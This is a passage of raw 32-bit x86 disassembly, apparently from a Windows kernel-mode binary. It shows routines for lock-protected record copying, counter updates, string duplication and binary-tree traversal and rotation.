   10e84:	push   eax
   10e85:	lea    eax,[ebp-0x10]
   10e88:	push   eax
   10e89:	call   DWORD PTR ds:0x1f020
   10e8f:	neg    eax
   10e91:	sbb    eax,eax
   10e93:	inc    eax
   10e94:	jmp    0x10e98
   10e96:	xor    al,al
   10e98:	pop    edi
   10e99:	pop    esi
   10e9a:	leave  
   10e9b:	ret    0x8
   10e9e:	int3   
   10e9f:	int3   
   10ea0:	int3   
   10ea1:	int3   
   10ea2:	int3   
   10ea3:	int3   
   10ea4:	mov    edi,edi
   10ea6:	push   ebp
   10ea7:	mov    ebp,esp
   10ea9:	push   ebx
   10eaa:	xor    eax,eax
   10eac:	push   eax
   10ead:	push   eax
   10eae:	push   eax
   10eaf:	push   eax
   10eb0:	mov    ebx,0x7eb44
   10eb5:	push   ebx
   10eb6:	call   DWORD PTR ds:0x1f028
   10ebc:	test   eax,eax
   10ebe:	jge    0x10ec4
   10ec0:	xor    al,al
   10ec2:	jmp    0x10ee7
   10ec4:	push   esi
   10ec5:	mov    esi,DWORD PTR [ebp+0x8]
   10ec8:	push   edi
   10ec9:	imul   esi,esi,0x14
   10ecc:	mov    edi,DWORD PTR [ebp+0xc]
   10ecf:	push   0x5
   10ed1:	pop    ecx
   10ed2:	push   0x0
   10ed4:	add    esi,0x7ed94
   10eda:	push   ebx
   10edb:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10edd:	call   DWORD PTR ds:0x1f024
   10ee3:	pop    edi
   10ee4:	mov    al,0x1
   10ee6:	pop    esi
   10ee7:	pop    ebx
   10ee8:	pop    ebp
   10ee9:	ret    0x8
   10eec:	int3   
   10eed:	int3   
   10eee:	int3   
   10eef:	int3   
   10ef0:	int3   
   10ef1:	int3   
   10ef2:	mov    edi,edi
   10ef4:	push   ebp
   10ef5:	mov    ebp,esp
   10ef7:	push   ebx
   10ef8:	xor    eax,eax
   10efa:	push   eax
   10efb:	push   eax
   10efc:	push   eax
   10efd:	push   eax
   10efe:	mov    ebx,0x7eb44
   10f03:	push   ebx
   10f04:	call   DWORD PTR ds:0x1f028
   10f0a:	test   eax,eax
   10f0c:	jl     0x10f2f
   10f0e:	push   esi
   10f0f:	mov    esi,DWORD PTR [ebp+0xc]
   10f12:	push   edi
   10f13:	mov    edi,DWORD PTR [ebp+0x8]
   10f16:	imul   edi,edi,0x14
   10f19:	push   0x5
   10f1b:	pop    ecx
   10f1c:	push   0x0
   10f1e:	add    edi,0x7ed94
   10f24:	push   ebx
   10f25:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10f27:	call   DWORD PTR ds:0x1f024
   10f2d:	pop    edi
   10f2e:	pop    esi
   10f2f:	pop    ebx
   10f30:	pop    ebp
   10f31:	ret    0x8
   10f34:	int3   
   10f35:	int3   
   10f36:	int3   
   10f37:	int3   
   10f38:	int3   
   10f39:	int3   
   10f3a:	mov    edi,edi
   10f3c:	push   ebp
   10f3d:	mov    ebp,esp
   10f3f:	sub    esp,0x14
   10f42:	and    DWORD PTR [ebp-0x14],0x0
   10f46:	push   edi
   10f47:	xor    eax,eax
   10f49:	lea    edi,[ebp-0x10]
   10f4c:	stos   DWORD PTR es:[edi],eax
   10f4d:	stos   DWORD PTR es:[edi],eax
   10f4e:	stos   DWORD PTR es:[edi],eax
   10f4f:	stos   DWORD PTR es:[edi],eax
   10f50:	lea    eax,[ebp-0x14]
   10f53:	push   eax
   10f54:	push   DWORD PTR [ebp+0x8]
   10f57:	call   0x10ef2
   10f5c:	pop    edi
   10f5d:	leave  
   10f5e:	ret    0x4
   10f61:	int3   
   10f62:	int3   
   10f63:	int3   
   10f64:	int3   
   10f65:	int3   
   10f66:	mov    edi,edi
   10f68:	push   ebp
   10f69:	mov    ebp,esp
   10f6b:	push   ebx
   10f6c:	xor    eax,eax
   10f6e:	push   eax
   10f6f:	push   eax
   10f70:	push   eax
   10f71:	push   eax
   10f72:	mov    ebx,0x7ecd0
   10f77:	push   ebx
   10f78:	call   DWORD PTR ds:0x1f028
   10f7e:	test   eax,eax
   10f80:	jl     0x10f9c
   10f82:	push   esi
   10f83:	mov    esi,DWORD PTR [ebp+0x8]
   10f86:	push   edi
   10f87:	push   0x40
   10f89:	pop    ecx
   10f8a:	push   0x0
   10f8c:	mov    edi,0x7edc0
   10f91:	push   ebx
   10f92:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10f94:	call   DWORD PTR ds:0x1f024
   10f9a:	pop    edi
   10f9b:	pop    esi
   10f9c:	pop    ebx
   10f9d:	pop    ebp
   10f9e:	ret    0x4
   10fa1:	int3   
   10fa2:	int3   
   10fa3:	int3   
   10fa4:	int3   
   10fa5:	int3   
   10fa6:	mov    edi,edi
   10fa8:	push   ebp
   10fa9:	mov    ebp,esp
   10fab:	push   ebx
   10fac:	xor    eax,eax
   10fae:	push   eax
   10faf:	push   eax
   10fb0:	push   eax
   10fb1:	push   eax
   10fb2:	mov    ebx,0x7ecd0
   10fb7:	push   ebx
   10fb8:	call   DWORD PTR ds:0x1f028
   10fbe:	test   eax,eax
   10fc0:	jge    0x10fc6
   10fc2:	xor    al,al
   10fc4:	jmp    0x10fec
   10fc6:	push   esi
   10fc7:	push   edi
   10fc8:	mov    edi,DWORD PTR [ebp+0x8]
   10fcb:	push   0x40
   10fcd:	pop    ecx
   10fce:	push   0x0
   10fd0:	mov    esi,0x7edc0
   10fd5:	push   ebx
   10fd6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10fd8:	call   DWORD PTR ds:0x1f024
   10fde:	xor    eax,eax
   10fe0:	cmp    WORD PTR ds:0x7edc0,ax
   10fe7:	pop    edi
   10fe8:	setne  al
   10feb:	pop    esi
   10fec:	pop    ebx
   10fed:	pop    ebp
   10fee:	ret    0x4
   10ff1:	int3   
   10ff2:	int3   
   10ff3:	int3   
   10ff4:	int3   
   10ff5:	int3   
   10ff6:	mov    edi,edi
   10ff8:	push   ebp
   10ff9:	mov    ebp,esp
   10ffb:	push   ebx
   10ffc:	mov    ebx,DWORD PTR [ebp+0x8]
   10fff:	cmp    ebx,0x40
   11002:	ja     0x1102f
   11004:	push   esi
   11005:	push   edi
   11006:	xor    edi,edi
   11008:	push   edi
   11009:	push   edi
   1100a:	push   edi
   1100b:	push   edi
   1100c:	mov    esi,0x7ed0c
   11011:	push   esi
   11012:	call   DWORD PTR ds:0x1f028
   11018:	test   eax,eax
   1101a:	jl     0x1102d
   1101c:	push   edi
   1101d:	lea    eax,[ebx*4+0x7ebd0]
   11024:	inc    DWORD PTR [eax]
   11026:	push   esi
   11027:	call   DWORD PTR ds:0x1f024
   1102d:	pop    edi
   1102e:	pop    esi
   1102f:	pop    ebx
   11030:	pop    ebp
   11031:	ret    0x4
   11034:	int3   
   11035:	int3   
   11036:	int3   
   11037:	int3   
   11038:	int3   
   11039:	int3   
   1103a:	mov    edi,edi
   1103c:	push   ebp
   1103d:	mov    ebp,esp
   1103f:	push   ebx
   11040:	push   esi
   11041:	push   edi
   11042:	mov    edi,DWORD PTR [ebp+0x8]
   11045:	cmp    edi,0x40
   11048:	ja     0x11073
   1104a:	xor    ebx,ebx
   1104c:	push   ebx
   1104d:	push   ebx
   1104e:	push   ebx
   1104f:	push   ebx
   11050:	mov    esi,0x7ed0c
   11055:	push   esi
   11056:	call   DWORD PTR ds:0x1f028
   1105c:	test   eax,eax
   1105e:	jl     0x11073
   11060:	mov    edi,DWORD PTR [edi*4+0x7ebd0]
   11067:	push   ebx
   11068:	push   esi
   11069:	call   DWORD PTR ds:0x1f024
   1106f:	mov    eax,edi
   11071:	jmp    0x11075
   11073:	xor    eax,eax
   11075:	pop    edi
   11076:	pop    esi
   11077:	pop    ebx
   11078:	pop    ebp
   11079:	ret    0x4
   1107c:	int3   
   1107d:	int3   
   1107e:	int3   
   1107f:	int3   
   11080:	int3   
   11081:	int3   
   11082:	mov    edi,edi
   11084:	push   ebp
   11085:	mov    ebp,esp
   11087:	push   esi
   11088:	mov    esi,DWORD PTR [ebp+0x8]
   1108b:	push   edi
   1108c:	push   DWORD PTR [esi]
   1108e:	call   0x10a66
   11093:	push   DWORD PTR [esi]
   11095:	mov    edi,eax
   11097:	push   esi
   11098:	push   edi
   11099:	call   0x1dade
   1109e:	add    esp,0x10
   110a1:	mov    eax,edi
   110a3:	pop    edi
   110a4:	pop    esi
   110a5:	pop    ebp
   110a6:	ret    0x4
   110a9:	int3   
   110aa:	int3   
   110ab:	int3   
   110ac:	int3   
   110ad:	int3   
   110ae:	mov    edi,edi
   110b0:	push   ebp
   110b1:	mov    ebp,esp
   110b3:	push   esi
   110b4:	mov    esi,DWORD PTR [ebp+0xc]
   110b7:	push   edi
   110b8:	mov    edi,ecx
   110ba:	cmp    esi,0xffffffff
   110bd:	jne    0x110ce
   110bf:	mov    esi,DWORD PTR [ebp+0x8]
   110c2:	lea    ecx,[esi+0x1]
   110c5:	mov    al,BYTE PTR [esi]
   110c7:	inc    esi
   110c8:	test   al,al
   110ca:	jne    0x110c5
   110cc:	sub    esi,ecx
   110ce:	lea    eax,[esi+0x1]
   110d1:	push   eax
   110d2:	call   0x10a66
   110d7:	pop    ecx
   110d8:	mov    DWORD PTR [edi],eax
   110da:	test   eax,eax
   110dc:	jne    0x110e9
   110de:	push   0xc000009a
   110e3:	call   DWORD PTR ds:0x1f014
   110e9:	mov    eax,DWORD PTR [edi]
   110eb:	push   esi
   110ec:	push   DWORD PTR [ebp+0x8]
   110ef:	mov    BYTE PTR [esi+eax*1],0x0
   110f3:	push   DWORD PTR [edi]
   110f5:	call   0x1dade
   110fa:	add    esp,0xc
   110fd:	mov    DWORD PTR [edi+0x4],esi
   11100:	pop    edi
   11101:	pop    esi
   11102:	pop    ebp
   11103:	ret    0x8
   11106:	int3   
   11107:	int3   
   11108:	int3   
   11109:	int3   
   1110a:	int3   
   1110b:	int3   
   1110c:	mov    edi,edi
   1110e:	push   ebp
   1110f:	mov    ebp,esp
   11111:	mov    eax,DWORD PTR [ebp+0x8]
   11114:	mov    edx,DWORD PTR [ebp+0xc]
   11117:	push   esi
   11118:	xor    esi,esi
   1111a:	jmp    0x1113f
   1111c:	mov    ecx,eax
   1111e:	and    ecx,0x1
   11121:	or     ecx,esi
   11123:	push   esi
   11124:	jne    0x11131
   11126:	push   0x2
   11128:	push   edx
   11129:	push   eax
   1112a:	call   0x1dac6
   1112f:	jmp    0x1113f
   11131:	push   0x3
   11133:	push   edx
   11134:	push   eax
   11135:	call   0x1daba
   1113a:	add    eax,0x1
   1113d:	adc    edx,esi
   1113f:	cmp    eax,0x4
   11142:	jne    0x1111c
   11144:	cmp    edx,esi
   11146:	jne    0x1111c
   11148:	pop    esi
   11149:	pop    ebp
   1114a:	ret    0x8
   1114d:	int3   
   1114e:	int3   
   1114f:	int3   
   11150:	int3   
   11151:	int3   
   11152:	mov    edi,edi
   11154:	push   ebp
   11155:	mov    ebp,esp
   11157:	push   esi
   11158:	push   edi
   11159:	mov    edi,DWORD PTR [ebp+0xc]
   1115c:	mov    esi,ecx
   1115e:	cmp    edi,0xffffffff
   11161:	jne    0x1116d
   11163:	push   DWORD PTR [ebp+0x8]
   11166:	call   0x109c0
   1116b:	mov    edi,eax
   1116d:	xor    ecx,ecx
   1116f:	push   0x2
   11171:	pop    edx
   11172:	lea    eax,[edi+0x1]
   11175:	mul    edx
   11177:	seto   cl
   1117a:	neg    ecx
   1117c:	or     ecx,eax
   1117e:	push   ecx
   1117f:	call   0x10a66
   11184:	pop    ecx
   11185:	mov    DWORD PTR [esi],eax
   11187:	test   eax,eax
   11189:	jne    0x11196
   1118b:	push   0xc000009a
   11190:	call   DWORD PTR ds:0x1f014
   11196:	mov    ecx,DWORD PTR [esi]
   11198:	lea    eax,[edi+edi*1]
   1119b:	push   eax
   1119c:	push   DWORD PTR [ebp+0x8]
   1119f:	xor    edx,edx
   111a1:	mov    WORD PTR [eax+ecx*1],dx
   111a5:	push   DWORD PTR [esi]
   111a7:	call   0x1dade
   111ac:	add    esp,0xc
   111af:	mov    DWORD PTR [esi+0x4],edi
   111b2:	pop    edi
   111b3:	pop    esi
   111b4:	pop    ebp
   111b5:	ret    0x8
   111b8:	int3   
   111b9:	int3   
   111ba:	int3   
   111bb:	int3   
   111bc:	int3   
   111bd:	int3   
   111be:	mov    edi,edi
   111c0:	push   ebp
   111c1:	mov    ebp,esp
   111c3:	mov    eax,DWORD PTR [ebp+0x8]
   111c6:	mov    edx,DWORD PTR ds:0x7f6c8
   111cc:	jmp    0x111d0
   111ce:	mov    eax,ecx
   111d0:	mov    ecx,DWORD PTR [eax+0x8]
   111d3:	cmp    ecx,edx
   111d5:	jne    0x111ce
   111d7:	pop    ebp
   111d8:	ret    0x4
   111db:	int3   
   111dc:	int3   
   111dd:	int3   
   111de:	int3   
   111df:	int3   
   111e0:	mov    edi,edi
   111e2:	push   ebp
   111e3:	mov    ebp,esp
   111e5:	mov    eax,DWORD PTR [ebp+0x8]
   111e8:	mov    edx,DWORD PTR ds:0x7f6c8
   111ee:	jmp    0x111f2
   111f0:	mov    eax,ecx
   111f2:	mov    ecx,DWORD PTR [eax]
   111f4:	cmp    ecx,edx
   111f6:	jne    0x111f0
   111f8:	pop    ebp
   111f9:	ret    0x4
   111fc:	int3   
   111fd:	int3   
   111fe:	int3   
   111ff:	int3   
   11200:	int3   
   11201:	int3   
   11202:	mov    edi,edi
   11204:	push   ebp
   11205:	mov    ebp,esp
   11207:	mov    eax,DWORD PTR [ebp+0x8]
   1120a:	mov    edx,DWORD PTR ds:0x7f6cc
   11210:	jmp    0x11214
   11212:	mov    eax,ecx
   11214:	mov    ecx,DWORD PTR [eax+0x8]
   11217:	cmp    ecx,edx
   11219:	jne    0x11212
   1121b:	pop    ebp
   1121c:	ret    0x4
   1121f:	int3   
   11220:	int3   
   11221:	int3   
   11222:	int3   
   11223:	int3   
   11224:	mov    edi,edi
   11226:	push   ebp
   11227:	mov    ebp,esp
   11229:	mov    eax,DWORD PTR [ebp+0x8]
   1122c:	mov    edx,DWORD PTR ds:0x7f6cc
   11232:	jmp    0x11236
   11234:	mov    eax,ecx
   11236:	mov    ecx,DWORD PTR [eax]
   11238:	cmp    ecx,edx
   1123a:	jne    0x11234
   1123c:	pop    ebp
   1123d:	ret    0x4
   11240:	int3   
   11241:	int3   
   11242:	int3   
   11243:	int3   
   11244:	int3   
   11245:	int3   
   11246:	mov    edi,edi
   11248:	push   ebp
   11249:	mov    ebp,esp
   1124b:	mov    eax,DWORD PTR [ebp+0x8]
   1124e:	mov    edx,DWORD PTR ds:0x7f6d0
   11254:	jmp    0x11258
   11256:	mov    eax,ecx
   11258:	mov    ecx,DWORD PTR [eax+0x8]
   1125b:	cmp    ecx,edx
   1125d:	jne    0x11256
   1125f:	pop    ebp
   11260:	ret    0x4
   11263:	int3   
   11264:	int3   
   11265:	int3   
   11266:	int3   
   11267:	int3   
   11268:	mov    edi,edi
   1126a:	push   ebp
   1126b:	mov    ebp,esp
   1126d:	mov    eax,DWORD PTR [ebp+0x8]
   11270:	mov    edx,DWORD PTR ds:0x7f6d0
   11276:	jmp    0x1127a
   11278:	mov    eax,ecx
   1127a:	mov    ecx,DWORD PTR [eax]
   1127c:	cmp    ecx,edx
   1127e:	jne    0x11278
   11280:	pop    ebp
   11281:	ret    0x4
   11284:	int3   
   11285:	int3   
   11286:	int3   
   11287:	int3   
   11288:	int3   
   11289:	int3   
   1128a:	mov    edi,edi
   1128c:	push   esi
   1128d:	mov    esi,ecx
   1128f:	mov    ecx,DWORD PTR [esi]
   11291:	cmp    DWORD PTR [ecx+0x14],0x0
   11295:	jne    0x112a4
   11297:	mov    eax,DWORD PTR [ecx+0x4]
   1129a:	cmp    DWORD PTR [eax+0x4],ecx
   1129d:	jne    0x112a4
   1129f:	mov    eax,DWORD PTR [ecx+0x8]
   112a2:	jmp    0x112c1
   112a4:	mov    eax,DWORD PTR [ecx]
   112a6:	cmp    eax,DWORD PTR ds:0x7f6c8
   112ac:	je     0x112ba
   112ae:	push   eax
   112af:	call   0x111be
   112b4:	jmp    0x112c1
   112b6:	mov    DWORD PTR [esi],eax
   112b8:	mov    ecx,eax
   112ba:	mov    eax,DWORD PTR [ecx+0x4]
   112bd:	cmp    ecx,DWORD PTR [eax]
   112bf:	je     0x112b6
   112c1:	mov    DWORD PTR [esi],eax
   112c3:	pop    esi
   112c4:	ret    
   112c5:	int3   
   112c6:	int3   
   112c7:	int3   
   112c8:	int3   
   112c9:	int3   
   112ca:	mov    edi,edi
   112cc:	push   esi
   112cd:	mov    esi,ecx
   112cf:	mov    ecx,DWORD PTR [esi]
   112d1:	mov    eax,DWORD PTR [ecx+0x8]
   112d4:	cmp    eax,DWORD PTR ds:0x7f6c8
   112da:	je     0x112e8
   112dc:	push   eax
   112dd:	call   0x111e0
   112e2:	jmp    0x112f7
   112e4:	mov    DWORD PTR [esi],eax
   112e6:	mov    ecx,eax
   112e8:	mov    eax,DWORD PTR [ecx+0x4]
   112eb:	cmp    ecx,DWORD PTR [eax+0x8]
   112ee:	je     0x112e4
   112f0:	mov    ecx,DWORD PTR [esi]
   112f2:	cmp    DWORD PTR [ecx+0x8],eax
   112f5:	je     0x112f9
   112f7:	mov    DWORD PTR [esi],eax
   112f9:	pop    esi
   112fa:	ret    
   112fb:	int3   
   112fc:	int3   
   112fd:	int3   
   112fe:	int3   
   112ff:	int3   
   11300:	mov    edi,edi
   11302:	push   ebp
   11303:	mov    ebp,esp
   11305:	mov    edx,DWORD PTR [ebp+0x8]
   11308:	mov    eax,DWORD PTR [edx+0x8]
   1130b:	push   esi
   1130c:	mov    esi,DWORD PTR [eax]
   1130e:	mov    DWORD PTR [edx+0x8],esi
   11311:	mov    esi,DWORD PTR [eax]
   11313:	cmp    esi,DWORD PTR ds:0x7f6d4
   11319:	je     0x1131e
   1131b:	mov    DWORD PTR [esi+0x4],edx
   1131e:	mov    esi,DWORD PTR [edx+0x4]
   11321:	mov    DWORD PTR [eax+0x4],esi
   11324:	mov    ecx,DWORD PTR [ecx+0x4]
   11327:	pop    esi
   11328:	cmp    edx,DWORD PTR [ecx+0x4]
   1132b:	jne    0x11332
   1132d:	mov    DWORD PTR [ecx+0x4],eax
   11330:	jmp    0x11340
   11332:	mov    ecx,DWORD PTR [edx+0x4]
   11335:	cmp    edx,DWORD PTR [ecx]
   11337:	jne    0x1133d
   11339:	mov    DWORD PTR [ecx],eax
   1133b:	jmp    0x11340
   1133d:	mov    DWORD PTR [ecx+0x8],eax
   11340:	mov    DWORD PTR [eax],edx
   11342:	mov    DWORD PTR [edx+0x4],eax
   11345:	pop    ebp
   11346:	ret    0x4
   11349:	int3   
   1134a:	int3   
   1134b:	int3   
   1134c:	int3   
   1134d:	int3   
   1134e:	mov    edi,edi
   11350:	push   ebp
   11351:	mov    ebp,esp
   11353:	mov    eax,DWORD PTR [ebp+0x8]
   11356:	mov    edx,DWORD PTR ds:0x7f6d4
   1135c:	jmp    0x11360
   1135e:	mov    eax,ecx
   11360:	mov    ecx,DWORD PTR [eax+0x8]
   11363:	cmp    ecx,edx
   11365:	jne    0x1135e
   11367:	pop    ebp
   11368:	ret    0x4
   1136b:	int3   
   1136c:	int3   
   1136d:	int3   
   1136e:	int3   
   1136f:	int3   
   11370:	mov    edi,edi
   11372:	push   ebp
   11373:	mov    ebp,esp
   11375:	mov    edx,DWORD PTR [ebp+0x8]
   11378:	mov    eax,DWORD PTR [edx]
   1137a:	push   esi
   1137b:	mov    esi,DWORD PTR [eax+0x8]
   1137e:	mov    DWORD PTR [edx],esi
   11380:	mov    esi,DWORD PTR [eax+0x8]
   11383:	cmp    esi,DWORD PTR ds:0x7f6d4
   11389:	je     0x1138e
   1138b:	mov    DWORD PTR [esi+0x4],edx
   1138e:	mov    esi,DWORD PTR [edx+0x4]
   11391:	mov    DWORD PTR [eax+0x4],esi
   11394:	mov    ecx,DWORD PTR [ecx+0x4]
   11397:	pop    esi
   11398:	cmp    edx,DWORD PTR [ecx+0x4]
   1139b:	jne    0x113a2
   1139d:	mov    DWORD PTR [ecx+0x4],eax
   113a0:	jmp    0x113b1
   113a2:	mov    ecx,DWORD PTR [edx+0x4]
   113a5:	cmp    edx,DWORD PTR [ecx+0x8]
   113a8:	jne    0x113af
   113aa:	mov    DWORD PTR [ecx+0x8],eax
   113ad:	jmp    0x113b1
   113af:	mov    DWORD PTR [ecx],eax
   113b1:	mov    DWORD PTR [eax+0x8],edx
   113b4:	mov    DWORD PTR [edx+0x4],eax
   113b7:	pop    ebp
   113b8:	ret    0x4
   113bb:	int3   
   113bc:	int3   
   113bd:	int3   
   113be:	int3   
   113bf:	int3   
   113c0:	mov    edi,edi
   113c2:	push   esi
   113c3:	mov    esi,ecx
   113c5:	mov    ecx,DWORD PTR [esi]
   113c7:	cmp    DWORD PTR [ecx+0x68],0x0
   113cb:	jne    0x113da
   113cd:	mov    eax,DWORD PTR [ecx+0x4]
   113d0:	cmp    DWORD PTR [eax+0x4],ecx
   113d3:	jne    0x113da
   113d5:	mov    eax,DWORD PTR [ecx+0x8]
   113d8:	jmp    0x113f7
   113da:	mov    eax,DWORD PTR [ecx]
   113dc:	cmp    eax,DWORD PTR ds:0x7f6d4
   113e2:	je     0x113f0
   113e4:	push   eax
   113e5:	call   0x1134e
   113ea:	jmp    0x113f7
   113ec:	mov    DWORD PTR [esi],eax
   113ee:	mov    ecx,eax
   113f0:	mov    eax,DWORD PTR [ecx+0x4]
   113f3:	cmp    ecx,DWORD PTR [eax]
   113f5:	je     0x113ec
   113f7:	mov    DWORD PTR [esi],eax
   113f9:	pop    esi
   113fa:	ret    
   113fb:	int3   
   113fc:	int3   
   113fd:	int3   
   113fe:	int3   
   113ff:	int3   
   11400:	mov    edi,edi
   11402:	push   ebp
   11403:	mov    ebp,esp
   11405:	mov    eax,DWORD PTR [ebp+0x8]
   11408:	mov    edx,DWORD PTR ds:0x7f6d8
   1140e:	jmp    0x11412
   11410:	mov    eax,ecx
   11412:	mov    ecx,DWORD PTR [eax+0x8]
   11415:	cmp    ecx,edx
   11417:	jne    0x11410
   11419:	pop    ebp
   1141a:	ret    0x4
   1141d:	int3   
   1141e:	int3   
   1141f:	int3   
   11420:	int3   
   11421:	int3   
   11422:	mov    edi,edi
   11424:	push   ebp
   11425:	mov    ebp,esp
   11427:	mov    eax,DWORD PTR [ebp+0x8]
   1142a:	mov    edx,DWORD PTR ds:0x7f6d8
   11430:	jmp    0x11434
   11432:	mov    eax,ecx
   11434:	mov    ecx,DWORD PTR [eax]
   11436:	cmp    ecx,edx
   11438:	jne    0x11432
   1143a:	pop    ebp
   1143b:	ret    0x4
   1143e:	int3   
   1143f:	int3   
   11440:	int3   
   11441:	int3   
   11442:	int3   
   11443:	int3   
   11444:	mov    edi,edi
   11446:	push   esi
   11447:	mov    esi,ecx
   11449:	mov    ecx,DWORD PTR [esi]
   1144b:	cmp    DWORD PTR [ecx+0x1c],0x0
   1144f:	jne    0x1145e
   11451:	mov    eax,DWORD PTR [ecx+0x4]
   11454:	cmp    DWORD PTR [eax+0x4],ecx
   11457:	jne    0x1145e
   11459:	mov    eax,DWORD PTR [ecx+0x8]
   1145c:	jmp    0x1147b
   1145e:	mov    eax,DWORD PTR [ecx]
   11460:	cmp    eax,DWORD PTR ds:0x7f6d8
   11466:	je     0x11474
   11468:	push   eax
   11469:	call   0x11400
   1146e:	jmp    0x1147b
   11470:	mov    DWORD PTR [esi],eax
   11472:	mov    ecx,eax
   11474:	mov    eax,DWORD PTR [ecx+0x4]
   11477:	cmp    ecx,DWORD PTR [eax]
   11479:	je     0x11470
   1147b:	mov    DWORD PTR [esi],eax
   1147d:	pop    esi
   1147e:	ret    
   1147f:	int3   
   11480:	int3   
   11481:	int3   
   11482:	int3   
   11483:	int3   
   11484:	mov    edi,edi
   11486:	push   ebp
   11487:	mov    ebp,esp
   11489:	mov    eax,DWORD PTR [ebp+0x8]
   1148c:	mov    edx,DWORD PTR ds:0x7f6dc
   11492:	jmp    0x11496
   11494:	mov    eax,ecx
   11496:	mov    ecx,DWORD PTR [eax+0x8]
   11499:	cmp    ecx,edx
   1149b:	jne    0x11494
   1149d:	pop    ebp
   1149e:	ret    0x4
   114a1:	int3   
   114a2:	int3   
   114a3:	int3   
   114a4:	int3   
   114a5:	int3   
   114a6:	mov    edi,edi
   114a8:	push   ebp
   114a9:	mov    ebp,esp
   114ab:	mov    eax,DWORD PTR [ebp+0x8]
   114ae:	mov    edx,DWORD PTR ds:0x7f6dc
   114b4:	jmp    0x114b8
   114b6:	mov    eax,ecx
   114b8:	mov    ecx,DWORD PTR [eax]
   114ba:	cmp    ecx,edx
   114bc:	jne    0x114b6
   114be:	pop    ebp
   114bf:	ret    0x4
   114c2:	int3   
   114c3:	int3   
   114c4:	int3   
   114c5:	int3   
   114c6:	int3   
   114c7:	int3   
   114c8:	mov    edi,edi
   114ca:	push   esi
   114cb:	mov    esi,ecx
   114cd:	mov    ecx,DWORD PTR [esi]
   114cf:	cmp    DWORD PTR [ecx+0x14],0x0
   114d3:	jne    0x114e2
   114d5:	mov    eax,DWORD PTR [ecx+0x4]
   114d8:	cmp    DWORD PTR [eax+0x4],ecx
   114db:	jne    0x114e2
   114dd:	mov    eax,DWORD PTR [ecx+0x8]
   114e0:	jmp    0x114ff
   114e2:	mov    eax,DWORD PTR [ecx]
   114e4:	cmp    eax,DWORD PTR ds:0x7f6dc
   114ea:	je     0x114f8
   114ec:	push   eax
   114ed:	call   0x11484
   114f2:	jmp    0x114ff
   114f4:	mov    DWORD PTR [esi],eax
   114f6:	mov    ecx,eax
   114f8:	mov    eax,DWORD PTR [ecx+0x4]
   114fb:	cmp    ecx,DWORD PTR [eax]
   114fd:	je     0x114f4
   114ff:	mov    DWORD PTR [esi],eax
   11501:	pop    esi
   11502:	ret    
   11503:	int3   
   11504:	int3   
   11505:	int3   
   11506:	int3   
   11507:	int3   
   11508:	mov    edi,edi
   1150a:	push   esi
   1150b:	mov    esi,ecx
   1150d:	mov    ecx,DWORD PTR [esi]
   1150f:	cmp    DWORD PTR [ecx+0x70],0x0
   11513:	jne    0x11522
   11515:	mov    eax,DWORD PTR [ecx+0x4]
   11518:	cmp    DWORD PTR [eax+0x4],ecx
   1151b:	jne    0x11522
   1151d:	mov    eax,DWORD PTR [ecx+0x8]
   11520:	jmp    0x1153f
   11522:	mov    eax,DWORD PTR [ecx]
   11524:	cmp    eax,DWORD PTR ds:0x7f6d0
   1152a:	je     0x11538
   1152c:	push   eax
   1152d:	call   0x11246
   11532:	jmp    0x1153f
   11534:	mov    DWORD PTR [esi],eax
   11536:	mov    ecx,eax
   11538:	mov    eax,DWORD PTR [ecx+0x4]
   1153b:	cmp    ecx,DWORD PTR [eax]
   1153d:	je     0x11534
   1153f:	mov    DWORD PTR [esi],eax
   11541:	pop    esi
   11542:	ret    
   11543:	int3   
   11544:	int3   
   11545:	int3   
   11546:	int3   
   11547:	int3   
   11548:	mov    edi,edi
   1154a:	push   esi
   1154b:	mov    esi,ecx
   1154d:	mov    ecx,DWORD PTR [esi]
   1154f:	mov    eax,DWORD PTR [ecx+0x8]
   11552:	cmp    eax,DWORD PTR ds:0x7f6d8
   11558:	je     0x11566
   1155a:	push   eax
   1155b:	call   0x11422
   11560:	jmp    0x11575
   11562:	mov    DWORD PTR [esi],eax
   11564:	mov    ecx,eax
   11566:	mov    eax,DWORD PTR [ecx+0x4]
   11569:	cmp    ecx,DWORD PTR [eax+0x8]
   1156c:	je     0x11562
   1156e:	mov    ecx,DWORD PTR [esi]
   11570:	cmp    DWORD PTR [ecx+0x8],eax
   11573:	je     0x11577
   11575:	mov    DWORD PTR [esi],eax
   11577:	pop    esi
   11578:	ret    
   11579:	int3   
   1157a:	int3   
   1157b:	int3   
   1157c:	int3   
   1157d:	int3   
   1157e:	mov    edi,edi
   11580:	push   esi
   11581:	mov    esi,ecx
   11583:	mov    ecx,DWORD PTR [esi]
   11585:	mov    eax,DWORD PTR [ecx+0x8]
   11588:	cmp    eax,DWORD PTR ds:0x7f6dc
   1158e:	je     0x1159c
   11590:	push   eax
   11591:	call   0x114a6
   11596:	jmp    0x115ab
   11598:	mov    DWORD PTR [esi],eax
   1159a:	mov    ecx,eax
   1159c:	mov    eax,DWORD PTR [ecx+0x4]
   1159f:	cmp    ecx,DWORD PTR [eax+0x8]
   115a2:	je     0x11598
   115a4:	mov    ecx,DWORD PTR [esi]
   115a6:	cmp    DWORD PTR [ecx+0x8],eax
   115a9:	je     0x115ad
   115ab:	mov    DWORD PTR [esi],eax
   115ad:	pop    esi
   115ae:	ret    
   115af:	int3   
   115b0:	int3   
   115b1:	int3   
   115b2:	int3   
   115b3:	int3   
   115b4:	mov    edi,edi
   115b6:	push   ebp
   115b7:	mov    ebp,esp
   115b9:	mov    eax,DWORD PTR [ebp+0x8]
   115bc:	mov    edx,DWORD PTR ds:0x7f6e4
   115c2:	jmp    0x115c6
   115c4:	mov    eax,ecx
   115c6:	mov    ecx,DWORD PTR [eax+0x8]
   115c9:	cmp    ecx,edx
   115cb:	jne    0x115c4
   115cd:	pop    ebp
   115ce:	ret    0x4
   115d1:	int3   
   115d2:	int3   
   115d3:	int3   
   115d4:	int3   
   115d5:	int3   
   115d6:	mov    edi,edi
   115d8:	push   ebp
   115d9:	mov    ebp,esp
   115db:	push   ecx
   115dc:	push   ecx
   115dd:	mov    eax,DWORD PTR [ebp+0x8]
   115e0:	mov    DWORD PTR [ebp-0x4],eax
   115e3:	lea    ecx,[eax+0x2]
   115e6:	mov    dx,WORD PTR [eax]
   115e9:	inc    eax
   115ea:	inc    eax
   115eb:	test   dx,dx
   115ee:	jne    0x115e6
   115f0:	sub    eax,ecx
   115f2:	sar    eax,1
